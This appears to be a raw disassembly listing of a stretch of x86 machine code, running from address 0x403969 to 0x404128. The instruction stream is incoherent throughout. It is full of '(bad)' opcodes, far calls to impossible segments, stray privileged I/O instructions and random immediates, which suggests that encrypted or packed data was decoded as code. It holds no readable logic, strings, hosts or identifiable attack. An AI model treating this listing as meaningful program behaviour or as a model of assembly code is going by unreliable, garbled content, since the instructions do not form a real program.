  403969:	clc    
  40396a:	fcmovbe st,st(4)
  40396c:	mov    esi,0x2a678ae9
  403971:	adc    edi,DWORD PTR [ecx-0x6eda887f]
  403977:	repz loopne 0x4039a8
  40397a:	lahf   
  40397b:	inc    ebx
  40397c:	lock mov es,WORD PTR [ebx+eiz*1+0x52457d88]
  403984:	sbb    BYTE PTR [ebx],dl
  403986:	imul   BYTE PTR [edi+0xd6023a8]
  40398c:	inc    ebp
  40398d:	xor    al,0x8a
  40398f:	cdq    
  403990:	loopne 0x4039bb
  403992:	mov    edx,0x8d09c5b4
  403997:	das    
  403998:	inc    ebp
  403999:	rcl    DWORD PTR [ebx],cl
  40399b:	adc    DWORD PTR es:[eax],0x690aeea5
  4039a2:	pop    es
  4039a3:	jl     0x403a15
  4039a5:	jmp    0xb8031ec0
  4039aa:	xlat   BYTE PTR ds:[ebx]
  4039ab:	push   es
  4039ac:	xor    DWORD PTR [edi+0x70],eax
  4039af:	dec    esp
  4039b0:	sbb    ebp,DWORD PTR [edx+0x7e740408]
  4039b6:	cwde   
  4039b7:	call   0xd7a3:0x8472ab9e
  4039be:	call   DWORD PTR [esi+0x4b]
  4039c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039c2:	fbstp  TBYTE PTR [eax-0x4ba2ee4d]
  4039c8:	sbb    cl,bl
  4039ca:	repnz mov DWORD PTR [ebx-0x49],edi
  4039ce:	das    
  4039cf:	dec    ecx
  4039d0:	ret    
  4039d1:	push   0x457fec51
  4039d6:	fstp   QWORD PTR [edi+0x11b2e3ec]
  4039dc:	lods   al,BYTE PTR ds:[esi]
  4039dd:	(bad)  [edx]
  4039df:	dec    ebp
  4039e0:	fist   WORD PTR [ecx]
  4039e2:	scas   eax,DWORD PTR es:[edi]
  4039e3:	mov    cl,BYTE PTR [ebp+0x5d71379a]
  4039e9:	fxch   st(5)
  4039eb:	sbb    eax,0x6ff00f37
  4039f0:	sub    al,0x33
  4039f2:	fs push cs
  4039f4:	ror    ah,0x3e
  4039f7:	popf   
  4039f8:	sahf   
  4039f9:	xor    al,0x83
  4039fb:	fcomp  st(0)
  4039fd:	lahf   
  4039fe:	inc    ebx
  4039ff:	mov    al,0xb4
  403a01:	fs lahf 
  403a03:	icebp  
  403a04:	pop    edi
  403a05:	inc    edx
  403a06:	push   edx
  403a07:	pop    edi
  403a08:	stc    
  403a09:	jnp    0x403a24
  403a0b:	sti    
  403a0c:	sub    cl,BYTE PTR [ebx+0x2a]
  403a0f:	xor    DWORD PTR [edx-0x20],esi
  403a12:	or     edx,ebp
  403a14:	(bad)  
  403a15:	shr    BYTE PTR ss:[ebp-0x62],cl
  403a19:	retf   
  403a1a:	rol    DWORD PTR [esi+0x3353c65c],0x36
  403a21:	or     al,dh
  403a23:	fisub  WORD PTR [ebx-0x13155062]
  403a29:	sbb    dl,BYTE PTR [edi]
  403a2b:	fst    DWORD PTR [eax-0x46]
  403a2e:	add    BYTE PTR [esi-0x3e9c79de],al
  403a34:	cvtps2pd xmm0,QWORD PTR [edx]
  403a37:	sbb    dh,BYTE PTR [ebx]
  403a39:	daa    
  403a3a:	jmp    0xdd66962
  403a3f:	stos   BYTE PTR es:[edi],al
  403a40:	push   eax
  403a41:	(bad)  
  403a42:	mov    al,0x89
  403a44:	dec    eax
  403a45:	in     eax,dx
  403a46:	mov    ebx,0x6f735b76
  403a4b:	pop    es
  403a4c:	add    al,0xd7
  403a4e:	repnz int 0xff
  403a51:	imul   edx,DWORD PTR [edi-0x1d],0xb9ea4a02
  403a58:	aas    
  403a59:	jae    0x403ac1
  403a5b:	add    eax,0x104bf82a
  403a60:	addr16 repz out dx,eax
  403a63:	inc    esp
  403a64:	rcl    BYTE PTR ds:0x83b5bdd7,cl
  403a6a:	mov    al,ds:0x4de74bcb
  403a6f:	popa   
  403a70:	lahf   
  403a71:	leave  
  403a72:	xor    DWORD PTR [eax+0x15],eax
  403a75:	xchg   ebp,eax
  403a76:	xchg   DWORD PTR ds:[esi],eax
  403a79:	jecxz  0x403af9
  403a7b:	in     al,0x5e
  403a7d:	jmp    DWORD PTR ds:0x40fe6d9b
  403a83:	xchg   esi,eax
  403a84:	or     DWORD PTR [esp+eiz*4],ecx
  403a87:	xor    al,0xe5
  403a89:	pop    ss
  403a8a:	pop    ebx
  403a8b:	dec    eax
  403a8c:	sbb    ch,BYTE PTR ds:0x32012577
  403a92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a93:	ret    0x88af
  403a96:	push   edx
  403a97:	mul    DWORD PTR [esi+0xb]
  403a9a:	push   es
  403a9b:	jno    0x403a8f
  403a9d:	mov    ebx,0x54fb81f8
  403aa2:	jg     0x403b0a
  403aa4:	inc    ebp
  403aa5:	mov    ds:0xd6cfd3d,eax
  403aaa:	or     dh,BYTE PTR [edx-0x519eb8]
  403ab0:	out    0x18,eax
  403ab2:	call   0xca16:0xd6af81ef
  403ab9:	leave  
  403aba:	adc    eax,0x112b6912
  403abf:	lea    ecx,[eax+edx*2-0x38]
  403ac3:	lods   eax,DWORD PTR ds:[esi]
  403ac4:	fidiv  WORD PTR [ebx]
  403ac6:	pop    esp
  403ac7:	inc    ebp
  403ac8:	mov    esi,0x7e25ef0
  403acd:	inc    ecx
  403ace:	dec    ecx
  403acf:	(bad)  
  403ad0:	(bad)  
  403ad2:	mov    edx,0x111fb954
  403ad7:	pop    esi
  403ad8:	ret    
  403ad9:	mov    dh,0xad
  403adb:	shl    esp,1
  403add:	sbb    esp,edi
  403adf:	call   0x83f8:0xde3c527d
  403ae6:	mov    dh,0x64
  403ae8:	mov    edx,0x8c9f1af3
  403aed:	loope  0x403a70
  403aef:	and    ah,BYTE PTR [esi]
  403af1:	pop    ss
  403af2:	shl    eax,0xa8
  403af5:	xor    BYTE PTR [esp+ebp*4+0x3c],cl
  403af9:	popa   
  403afa:	sub    DWORD PTR [edx-0xd],0x6dfb7247
  403b01:	in     eax,dx
  403b02:	in     eax,0xb5
  403b04:	and    BYTE PTR [edx+0x220a6a76],dl
  403b0a:	mov    ecx,0x63419e00
  403b0f:	call   0x6ab5:0xd3c11592
  403b16:	(bad)  
  403b18:	sbb    eax,ebp
  403b1a:	imul   ebp,DWORD PTR [eax-0x1927313f],0xffffffaf
  403b21:	stc    
  403b22:	out    dx,al
  403b23:	mov    esi,0x94d4287f
  403b28:	test   DWORD PTR [eax+0x75],edx
  403b2b:	dec    esp
  403b2c:	push   edx
  403b2d:	scas   eax,DWORD PTR es:[edi]
  403b2e:	cmp    ch,BYTE PTR [ebx-0x4a9034e]
  403b34:	mov    ebx,0x6060a661
  403b39:	xlat   BYTE PTR ds:[ebx]
  403b3a:	and    DWORD PTR [edi+esi*4],0x17
  403b3e:	mov    ah,0x3f
  403b40:	cdq    
  403b41:	push   edi
  403b42:	xchg   BYTE PTR [edx-0x4f93a030],ch
  403b48:	shl    DWORD PTR ds:0xf6a4a325,1
  403b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b4f:	push   ebx
  403b50:	dec    ecx
  403b51:	pop    edx
  403b52:	shl    bh,cl
  403b54:	xchg   ebx,eax
  403b55:	push   edi
  403b56:	test   DWORD PTR [eax+ebx*4+0xf],ecx
  403b5a:	adc    eax,0xdf5d1c35
  403b5f:	jmp    0x403ba2
  403b61:	sub    al,0x78
  403b63:	push   esp
  403b64:	mov    esp,0x2d053b2a
  403b69:	lods   eax,DWORD PTR ds:[esi]
  403b6a:	je     0x403b16
  403b6c:	scas   eax,DWORD PTR es:[edi]
  403b6d:	xor    dl,ch
  403b6f:	mov    bh,0x1
  403b71:	sbb    edx,DWORD PTR [ecx-0x759e8bbc]
  403b77:	loope  0x403b91
  403b79:	xor    edx,eax
  403b7b:	imul   edi,DWORD PTR [edx],0xe072e4fd
  403b81:	fsubr  st,st(7)
  403b83:	popf   
  403b84:	jno    0x403b2c
  403b86:	mov    ebx,0x1729fdb3
  403b8b:	mov    ds:0xb05fff88,eax
  403b90:	fbld   TBYTE PTR [edx+0x75051719]
  403b96:	shr    BYTE PTR ds:0xd0c834b2,cl
  403b9c:	push   ecx
  403b9d:	inc    edx
  403b9e:	cmp    eax,0xe7c4e326
  403ba3:	pop    esi
  403ba4:	pop    edi
  403ba5:	cmp    edx,ebx
  403ba7:	cmp    eax,0x8fcd968e
  403bac:	scas   eax,DWORD PTR es:[edi]
  403bad:	mov    cl,0x79
  403baf:	adc    esp,DWORD PTR [ebx-0x4e]
  403bb2:	add    bh,dh
  403bb4:	stc    
  403bb5:	pop    esi
  403bb6:	jb     0x403b4e
  403bb8:	jno    0x403ba4
  403bba:	lods   eax,DWORD PTR ds:[esi]
  403bbb:	xor    BYTE PTR [edi],cl
  403bbd:	call   0x2ac38874
  403bc2:	ret    
  403bc3:	fimul  WORD PTR [eax]
  403bc5:	scas   eax,DWORD PTR es:[edi]
  403bc6:	out    dx,eax
  403bc7:	push   ecx
  403bc8:	(bad)  
  403bc9:	jmp    0xe3df9b9c
  403bce:	xor    edi,DWORD PTR [ebx+0x58]
  403bd1:	mov    ecx,0x6372c51a
  403bd6:	xchg   edi,eax
  403bd7:	das    
  403bd8:	cmp    DWORD PTR [esi-0x1a8771cc],0x3cdfd425
  403be2:	fimul  DWORD PTR [esi+0x10]
  403be5:	jmp    0x403ba2
  403be7:	inc    esi
  403be8:	dec    esi
  403be9:	test   DWORD PTR [ecx],ebx
  403beb:	jge    0x403b6e
  403bed:	das    
  403bee:	xor    ecx,DWORD PTR [eax]
  403bf0:	inc    ebx
  403bf1:	cli    
  403bf2:	add    al,0x39
  403bf4:	stc    
  403bf5:	cdq    
  403bf6:	in     eax,dx
  403bf7:	mov    dh,0xa4
  403bf9:	stos   BYTE PTR es:[edi],al
  403bfa:	sbb    BYTE PTR [esi+0x3c],0x8d
  403bfe:	mov    dh,BYTE PTR [ecx]
  403c00:	aam    0xdb
  403c02:	andps  xmm1,xmm0
  403c05:	scas   eax,DWORD PTR es:[edi]
  403c06:	dec    ebp
  403c07:	pop    esp
  403c08:	jnp    0x403be0
  403c0a:	popf   
  403c0b:	sar    BYTE PTR [edi],0x16
  403c0e:	xor    al,0x1e
  403c10:	in     al,dx
  403c11:	push   edx
  403c12:	in     al,0xf3
  403c14:	cmp    eax,DWORD PTR [ecx-0x6cf3fcbc]
  403c1a:	in     eax,dx
  403c1b:	mov    ah,dh
  403c1d:	loope  0x403c2c
  403c1f:	test   ebp,eax
  403c21:	cmp    al,0xa1
  403c23:	ret    0x3be0
  403c26:	loopne 0x403c20
  403c28:	sub    al,0xed
  403c2a:	outs   dx,BYTE PTR ds:[esi]
  403c2b:	loope  0x403c5f
  403c2d:	push   ecx
  403c2e:	sbb    ebp,edi
  403c30:	test   eax,0xe0108b8e
  403c35:	add    ebp,DWORD PTR [ebp-0x16]
  403c38:	jmp    0x403bef
  403c3a:	bound  edx,QWORD PTR [ecx+0xb22f2c7]
  403c40:	cmp    BYTE PTR [eax*8-0x2fe98a97],0x9d
  403c48:	dec    esp
  403c49:	es jnp 0x403c37
  403c4c:	scas   al,BYTE PTR es:[edi]
  403c4d:	pop    ss
  403c4e:	scas   al,BYTE PTR es:[edi]
  403c4f:	cmp    BYTE PTR [edi+0x87787c8],ch
  403c55:	or     al,0xbe
  403c57:	call   0xbd0:0xbf220b9e
  403c5e:	inc    esp
  403c5f:	cli    
  403c60:	pop    es
  403c61:	sub    dh,bh
  403c63:	mov    ah,0x5
  403c65:	lock nop
  403c67:	sbb    eax,0x67b459a0
  403c6c:	stos   BYTE PTR es:[edi],al
  403c6d:	mov    es,WORD PTR [edi+ecx*1-0x22]
  403c71:	xchg   ah,bh
  403c73:	mov    eax,0xfc53c665
  403c78:	push   ebp
  403c79:	and    edi,DWORD PTR [eax-0x74]
  403c7c:	das    
  403c7d:	shl    dh,cl
  403c7f:	gs jno 0x403c3b
  403c82:	pop    esp
  403c83:	mov    ecx,0xd4fc74bc
  403c88:	stc    
  403c89:	imul   edx
  403c8b:	pop    edx
  403c8c:	inc    edx
  403c8d:	jp     0x403d01
  403c8f:	xchg   esi,eax
  403c90:	mov    bh,BYTE PTR [ebx+ebx*1]
  403c93:	jno    0x403c65
  403c95:	test   DWORD PTR [edi-0x34],0xd8cbe289
  403c9c:	xchg   edi,eax
  403c9d:	popf   
  403c9e:	xor    ebx,DWORD PTR [esi-0x7b]
  403ca1:	push   cs
  403ca2:	jp     0x403c7e
  403ca4:	jl     0x403c77
  403ca6:	icebp  
  403ca7:	mov    cl,0x16
  403ca9:	dec    dl
  403cab:	add    esp,DWORD PTR [esi+0x71]
  403cae:	push   edi
  403caf:	fcomp  st(5)
  403cb1:	cmp    cl,BYTE PTR [edx]
  403cb3:	adc    ch,BYTE PTR [eax]
  403cb5:	xor    eax,0x1c80abe0
  403cba:	in     eax,dx
  403cbb:	dec    esi
  403cbc:	rcr    BYTE PTR [eax+0x20],0x4d
  403cc0:	pop    edi
  403cc1:	stos   BYTE PTR es:[edi],al
  403cc2:	jno    0x403c6f
  403cc4:	jmp    0x6f33:0x54fba355
  403ccb:	nop
  403ccc:	iret   
  403ccd:	rcr    bh,0xd5
  403cd0:	das    
  403cd1:	add    DWORD PTR [ebx],eax
  403cd3:	icebp  
  403cd4:	out    0xd9,eax
  403cd6:	sbb    DWORD PTR [esi+0x37],edx
  403cd9:	jae    0x403d54
  403cdb:	inc    ebp
  403cdc:	or     al,0x8c
  403cde:	sub    eax,0xdbd43077
  403ce3:	pop    ds
  403ce4:	in     al,dx
  403ce5:	out    0x42,al
  403ce7:	sub    ebx,DWORD PTR [edx]
  403ce9:	cs xchg esp,eax
  403ceb:	fisttp DWORD PTR [edx-0x1d]
  403cee:	mov    ds:0xa1b28b11,eax
  403cf3:	jecxz  0x403d16
  403cf5:	inc    sp
  403cf7:	aam    0xbe
  403cf9:	mov    ds:0x13bf289f,al
  403cfe:	push   ebp
  403cff:	aam    0xd5
  403d01:	push   0xcd63806d
  403d06:	gs add eax,0x6adadbd
  403d0c:	arpl   WORD PTR [eax-0x32],di
  403d0f:	js     0x403d8f
  403d11:	iret   
  403d12:	xchg   edx,eax
  403d13:	push   ebp
  403d14:	sar    BYTE PTR [ebx],cl
  403d16:	push   cs
  403d17:	inc    eax
  403d18:	push   ecx
  403d19:	lods   eax,DWORD PTR ds:[esi]
  403d1a:	frstor [ecx+0x21]
  403d1d:	pop    ebx
  403d1e:	or     cl,BYTE PTR [ebp-0xe]
  403d21:	add    edi,ebx
  403d23:	fisttp DWORD PTR [esi+0x7db2837e]
  403d29:	cmc    
  403d2a:	xor    ah,bh
  403d2c:	sub    DWORD PTR [edi],0x45f841a2
  403d32:	pushf  
  403d33:	add    al,0xe0
  403d35:	jl     0x403ce0
  403d37:	pop    ds
  403d38:	test   eax,0xee451ddd
  403d3d:	push   esi
  403d3e:	mov    ah,0x83
  403d40:	pop    esi
  403d41:	inc    edi
  403d42:	add    eax,0xf740a194
  403d47:	enter  0xe5f7,0x3f
  403d4b:	hlt    
  403d4c:	mov    bl,0xa4
  403d4e:	inc    ebx
  403d4f:	mov    BYTE PTR [ecx+0x7005fabe],bh
  403d55:	daa    
  403d56:	nop
  403d57:	push   ebx
  403d58:	cmc    
  403d59:	cmp    eax,0x9fc3a7d8
  403d5e:	js     0x403d45
  403d60:	or     cl,BYTE PTR [ecx+eiz*2]
  403d63:	jo     0x403d58
  403d65:	pop    ebx
  403d66:	sub    BYTE PTR [esi],0x1b
  403d69:	sub    DWORD PTR [edx],eax
  403d6b:	loopne 0x403de3
  403d6d:	sub    edi,DWORD PTR [ebp-0x47]
  403d70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d71:	jp     0x403de3
  403d73:	mov    ds:0x5b0a90a8,eax
  403d78:	(bad)  [edi-0x6c]
  403d7b:	iret   
  403d7c:	je     0x403de0
  403d7e:	cmp    BYTE PTR [ebp+0x517d81],al
  403d84:	xchg   BYTE PTR [ebx],dh
  403d86:	stos   DWORD PTR es:[edi],eax
  403d87:	imul   edi,DWORD PTR [ebx+edx*4+0x2c4a93c2],0x867137c7
  403d92:	enter  0xd94,0x22
  403d96:	mov    ch,dh
  403d98:	outs   dx,BYTE PTR ds:[esi]
  403d99:	cmc    
  403d9a:	pop    edi
  403d9b:	jmp    FWORD PTR [edi-0x788965b2]
  403da1:	addr16 popa 
  403da3:	push   ds
  403da4:	das    
  403da5:	enter  0xfaa6,0xff
  403da9:	inc    esi
  403daa:	pop    edi
  403dab:	stos   BYTE PTR es:[edi],al
  403dac:	outs   dx,BYTE PTR ds:[esi]
  403dad:	ins    DWORD PTR es:[edi],dx
  403dae:	popa   
  403daf:	retf   
  403db0:	xchg   edi,eax
  403db1:	sbb    DWORD PTR [eax+0x262bcf1d],0x4ec4ebfd
  403dbb:	pop    edx
  403dbc:	scas   eax,DWORD PTR es:[edi]
  403dbd:	push   0xffffffda
  403dbf:	dec    esi
  403dc0:	add    al,BYTE PTR ds:0xd03f3ec3
  403dc6:	bound  ebx,QWORD PTR [edi-0x30]
  403dc9:	pop    edi
  403dca:	pop    ss
  403dcb:	ror    BYTE PTR [ebp-0x6470253c],1
  403dd1:	out    dx,al
  403dd2:	lods   eax,DWORD PTR ds:[esi]
  403dd3:	into   
  403dd4:	popa   
  403dd5:	jp     0x403d58
  403dd7:	jo     0x403d81
  403dd9:	sbb    BYTE PTR [ecx],0xb6
  403ddc:	and    bl,BYTE PTR [edx-0x6b8899b6]
  403de2:	pop    ss
  403de3:	inc    ecx
  403de4:	pop    ecx
  403de5:	inc    edx
  403de6:	in     eax,0x92
  403de8:	pop    esi
  403de9:	jmp    0x197edd78
  403dee:	bnd ja 0x403dbe
  403df1:	or     cl,dh
  403df3:	adc    BYTE PTR [ebx+0x5b],ch
  403df6:	lds    ebp,FWORD PTR [eax+0x1c]
  403df9:	mov    ecx,0xe689b22f
  403dfe:	and    ah,BYTE PTR [eax]
  403e00:	xor    al,0xbe
  403e02:	(bad)  
  403e04:	mov    ebx,0xbe7e4e7
  403e09:	rol    DWORD PTR [ebp+0x72],1
  403e0c:	out    dx,eax
  403e0d:	jno    0x403e82
  403e0f:	fist   DWORD PTR [ebp+0x39]
  403e12:	aas    
  403e13:	mov    cl,0xe
  403e15:	pop    ecx
  403e16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e17:	sti    
  403e18:	and    cl,BYTE PTR [ebx]
  403e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e1b:	mov    al,0xf8
  403e1d:	adc    eax,0xf9666484
  403e22:	xlat   BYTE PTR ds:[ebx]
  403e23:	adc    DWORD PTR ds:0x7f6aaa65,esp
  403e29:	mov    ch,0x16
  403e2b:	and    BYTE PTR ds:0x97a15902,bh
  403e31:	jle    0x403e41
  403e33:	xchg   ebx,eax
  403e34:	call   0x7d8464eb
  403e39:	sub    al,BYTE PTR [esi+ebp*8+0xf]
  403e3d:	or     DWORD PTR [eax+0x78b98324],0x1f5c2b55
  403e47:	or     DWORD PTR [eax-0x6ce1e30d],0xa781fec9
  403e51:	add    eax,DWORD PTR [eax]
  403e53:	jmp    0x21d2cdfc
  403e58:	pusha  
  403e59:	push   ebp
  403e5a:	int3   
  403e5b:	sub    ebp,0xeda34a81
  403e61:	pop    ds
  403e62:	or     ecx,DWORD PTR [edi]
  403e64:	pop    ecx
  403e65:	fwait
  403e66:	out    dx,eax
  403e67:	xchg   bh,bl
  403e69:	and    BYTE PTR [edi],0xf9
  403e6c:	mov    WORD PTR [edi+0x6f3cce2d],gs
  403e72:	in     eax,dx
  403e73:	shr    BYTE PTR [edi+esi*1+0x3de57333],0xbf
  403e7b:	or     BYTE PTR [ebx-0x59ec8500],0x63
  403e82:	test   eax,0xd60e9f43
  403e87:	retf   
  403e88:	ins    BYTE PTR es:[edi],dx
  403e89:	pop    edx
  403e8a:	mov    dl,0x26
  403e8c:	inc    DWORD PTR [edi+0x61]
  403e8f:	mov    dl,0x3b
  403e91:	mov    cl,BYTE PTR cs:[esi+edi*8]
  403e95:	mov    bh,0x51
  403e97:	push   eax
  403e98:	lea    ebx,[edi-0x40]
  403e9b:	inc    ecx
  403e9c:	xor    al,0xcc
  403e9e:	in     eax,dx
  403e9f:	ror    BYTE PTR [edx-0x162105b4],0xdb
  403ea6:	shl    DWORD PTR [ecx-0x48b85597],0x61
  403ead:	dec    esi
  403eae:	add    al,0x32
  403eb0:	je     0x403eaa
  403eb2:	inc    ebx
  403eb3:	or     BYTE PTR [edi+esi*8],bl
  403eb6:	imul   eax,DWORD PTR [edx-0x7a9d5d41],0xccf54b7c
  403ec0:	inc    esp
  403ec1:	cmp    esp,ebp
  403ec3:	ds push ecx
  403ec5:	pop    ebp
  403ec6:	push   esi
  403ec7:	test   BYTE PTR [ebx-0x9],dl
  403eca:	mov    ebp,0x8ff39a16
  403ecf:	aaa    
  403ed0:	pusha  
  403ed1:	dec    edi
  403ed2:	mov    dl,cl
  403ed4:	jb     0x403f2f
  403ed6:	sbb    eax,ebp
  403ed8:	add    eax,0xb49be0c6
  403edd:	push   ds
  403ede:	and    BYTE PTR [edi],cl
  403ee0:	js     0x403ed7
  403ee2:	push   esp
  403ee3:	(bad)  
  403ee5:	pop    esp
  403ee6:	jmp    0x3f8b:0x2833f33
  403eed:	sbb    eax,0xada667f8
  403ef2:	jp     0x403e9a
  403ef4:	fild   DWORD PTR [ecx]
  403ef6:	xlat   BYTE PTR ds:[ebx]
  403ef7:	leave  
  403ef8:	sahf   
  403ef9:	out    0xbc,al
  403efb:	push   ecx
  403efc:	add    ecx,edx
  403efe:	loope  0x403f68
  403f00:	(bad)  
  403f01:	mov    bh,0x1b
  403f03:	pop    edx
  403f04:	mov    esi,0xbbfc2291
  403f09:	into   
  403f0a:	and    esp,DWORD PTR [edi]
  403f0c:	pop    ss
  403f0d:	cld    
  403f0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f0f:	dec    edi
  403f10:	mov    dl,0xa8
  403f12:	div    BYTE PTR [eax-0x1a]
  403f15:	(bad)  
  403f16:	ss ja  0x403f32
  403f19:	inc    edi
  403f1a:	cmp    DWORD PTR [edi+0x5d],esp
  403f1d:	cli    
  403f1e:	lods   eax,DWORD PTR ds:[esi]
  403f1f:	push   edx
  403f20:	push   edi
  403f21:	jae    0x403f97
  403f23:	dec    si
  403f25:	xchg   DWORD PTR [ecx],ebp
  403f27:	or     al,0x46
  403f29:	cld    
  403f2a:	out    dx,eax
  403f2b:	jne    0x403f89
  403f2d:	adc    cl,bl
  403f2f:	xlat   BYTE PTR ds:[ebx]
  403f30:	adc    BYTE PTR [esi],0x60
  403f33:	dec    ebp
  403f34:	sahf   
  403f35:	ss aad 0x3d
  403f38:	sbb    ch,BYTE PTR [eax+0x53498447]
  403f3e:	mov    eax,ds:0x7d103e14
  403f43:	fdiv   QWORD PTR [esi+0x18]
  403f46:	mov    ah,BYTE PTR [eax-0x19cc838]
  403f4c:	xchg   DWORD PTR [edx+edi*2-0x6800cbaf],ebx
  403f53:	cmc    
  403f54:	cmc    
  403f55:	add    edi,ecx
  403f57:	test   eax,0xd592da31
  403f5c:	or     BYTE PTR [bp+di],bh
  403f5f:	ja     0x403f03
  403f61:	mov    esi,0x5ea941d7
  403f66:	sbb    al,0x9c
  403f68:	push   edx
  403f69:	push   ds
  403f6a:	test   DWORD PTR [ebp+0x6d13afb7],0x4e63a076
  403f74:	adc    BYTE PTR [eax],ch
  403f76:	jl     0x403f47
  403f78:	mov    ds:0xd5583c59,al
  403f7d:	cmp    esp,esi
  403f7f:	enter  0xda77,0x79
  403f83:	test   BYTE PTR [edx+0x1d],dl
  403f86:	mov    ds:0x5a448668,al
  403f8b:	dec    ebx
  403f8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f8d:	retf   
  403f8e:	imul   esp,DWORD PTR [eax-0x2abf9328],0x25
  403f95:	out    0xcf,al
  403f97:	xchg   ebx,eax
  403f98:	xchg   ebx,eax
  403f99:	jae    0x403f87
  403f9b:	mov    ecx,0x572d4fbd
  403fa0:	pop    ebp
  403fa1:	iret   
  403fa2:	loopne 0x404023
  403fa4:	xor    DWORD PTR gs:[ebp-0x42893c1e],eax
  403fab:	add    edx,DWORD PTR [ebp-0x23]
  403fae:	adc    ebx,eax
  403fb0:	retf   0xd7f3
  403fb3:	or     al,0x6d
  403fb5:	rcr    DWORD PTR ds:0x1b6a1077,1
  403fbb:	cmp    BYTE PTR [edi],0xf7
  403fbe:	rol    DWORD PTR [ebp+0x22],cl
  403fc1:	dec    eax
  403fc2:	repnz and al,0x5e
  403fc5:	repz pusha 
  403fc7:	fmul   DWORD PTR [edi]
  403fc9:	cli    
  403fca:	and    ah,al
  403fcc:	in     al,dx
  403fcd:	sar    DWORD PTR [eax-0x1d],0x5c
  403fd1:	mov    WORD PTR [ebp+eax*8+0x14fc8ed],cs
  403fd8:	sbb    bl,BYTE PTR [ebp-0x34881c54]
  403fde:	add    BYTE PTR [edi+0x67],bh
  403fe1:	sbb    al,0xdc
  403fe3:	in     al,0x69
  403fe5:	int    0x6c
  403fe7:	jg     0x404060
  403fe9:	rcl    ecx,cl
  403feb:	pop    edx
  403fec:	sahf   
  403fed:	nop
  403fee:	sbb    al,0x35
  403ff0:	push   esp
  403ff1:	and    dh,al
  403ff3:	js     0x403fd2
  403ff5:	cmp    BYTE PTR [eax+ebp*8+0x30],ch
  403ff9:	js     0x404075
  403ffb:	aam    0x7d
  403ffd:	xor    eax,0xfbeff9e1
  404002:	(bad)  [ecx-0x5b]
  404005:	dec    ecx
  404006:	test   eax,0xec18aa36
  40400b:	add    BYTE PTR [ebx+0x19f8000],0x80
  404012:	aam    0xea
  404014:	sub    al,0xfb
  404016:	ret    
  404017:	jle    0x404022
  404019:	cmp    DWORD PTR [edx+0xc],ecx
  40401c:	jns    0x404005
  40401e:	push   eax
  40401f:	js     0x40407e
  404021:	dec    ebx
  404022:	xor    eax,0x53fea850
  404027:	fwait
  404028:	pop    esi
  404029:	mov    edx,0xda4d1a53
  40402e:	dec    eax
  40402f:	ds jns 0x40402c
  404032:	mov    dh,0x34
  404034:	or     bl,dh
  404036:	js     0x404089
  404038:	xlat   BYTE PTR ds:[ebx]
  404039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40403a:	js     0x404055
  40403c:	push   0xffffffb3
  40403e:	or     al,0xe
  404040:	leavew 
  404042:	push   0xffffffe4
  404044:	test   BYTE PTR [edx],bh
  404046:	jno    0x403fe4
  404048:	fsubp  st(2),st
  40404a:	fsub   QWORD PTR [edx-0x57]
  40404d:	push   ebp
  40404e:	mov    esi,0x3e9d8d69
  404053:	outs   dx,DWORD PTR ds:[esi]
  404054:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404055:	daa    
  404056:	pop    ds
  404057:	mov    eax,0x86de1799
  40405c:	aad    0x49
  40405e:	xor    al,0x82
  404060:	xchg   BYTE PTR [ebx+ebx*1-0x2b822644],ch
  404067:	ror    BYTE PTR [eax+0x4],0x29
  40406b:	mov    dh,0x68
  40406d:	(bad)  
  40406e:	daa    
  40406f:	dec    edi
  404070:	repnz cwde 
  404072:	scas   al,BYTE PTR es:[edi]
  404073:	loope  0x404044
  404075:	dec    edx
  404076:	or     cl,BYTE PTR [edx+esi*1+0x4b161997]
  40407d:	ss es jo 0x404093
  404081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404082:	dec    edi
  404083:	nop
  404084:	mov    ch,0x1a
  404086:	test   eax,0x32d05030
  40408b:	out    dx,eax
  40408c:	push   eax
  40408d:	xor    DWORD PTR [ebx-0x152ddf90],ebx
  404093:	lods   al,BYTE PTR ds:[esi]
  404094:	sub    ecx,DWORD PTR [edx+0x4e09600a]
  40409a:	xor    bl,BYTE PTR [ebx-0x46]
  40409d:	jne    0x40404c
  40409f:	mov    bh,0x6a
  4040a1:	mov    cl,BYTE PTR ds:0x89252533
  4040a7:	rol    DWORD PTR [eax],1
  4040a9:	stc    
  4040aa:	jns    0x4040bc
  4040ac:	outs   dx,DWORD PTR ds:[esi]
  4040ad:	aaa    
  4040ae:	call   0x904a7258
  4040b3:	stc    
  4040b4:	(bad)
  4040b9:	push   0x13fc01a7
  4040be:	add    eax,DWORD PTR [ecx+0x735e532e]
  4040c4:	stos   BYTE PTR es:[edi],al
  4040c5:	and    al,dh
  4040c7:	das    
  4040c8:	xchg   esp,eax
  4040c9:	add    eax,edi
  4040cb:	in     al,dx
  4040cc:	loopne 0x404114
  4040ce:	(bad)  
  4040cf:	aas    
  4040d0:	push   eax
  4040d1:	mov    WORD PTR [edx+0x61188faf],?
  4040d7:	jo     0x404142
  4040d9:	mov    al,0x79
  4040db:	cli    
  4040dc:	or     esi,DWORD PTR [esi]
  4040de:	pop    edx
  4040df:	call   0x589d:0xd3911cb7
  4040e6:	add    DWORD PTR [ecx-0x45d9c173],eax
  4040ec:	int    0xd1
  4040ee:	inc    ebx
  4040ef:	stc    
  4040f0:	dec    ebp
  4040f1:	add    ah,BYTE PTR [eax-0x1debfd0]
  4040f7:	inc    eax
  4040f8:	test   eax,0x3c8708da
  4040fd:	add    eax,0x1a5fe267
  404102:	sbb    eax,DWORD PTR [edx-0x60d07def]
  404108:	xor    al,0x10
  40410a:	push   esp
  40410b:	es xchg edx,eax
  40410d:	fs push cs
  40410f:	icebp  
  404110:	lahf   
  404111:	fdivr  DWORD PTR [edi-0x46375556]
  404117:	mov    cl,0xc9
  404119:	adc    DWORD PTR ds:0x2813a0bc,ecx
  40411f:	mov    ax,ds:0x3a3eeef3
  404125:	(bad)  
  404127:	stos   BYTE PTR es:[edi],al
  404128:	cmp    BYTE PTR [ebp-0x53],al
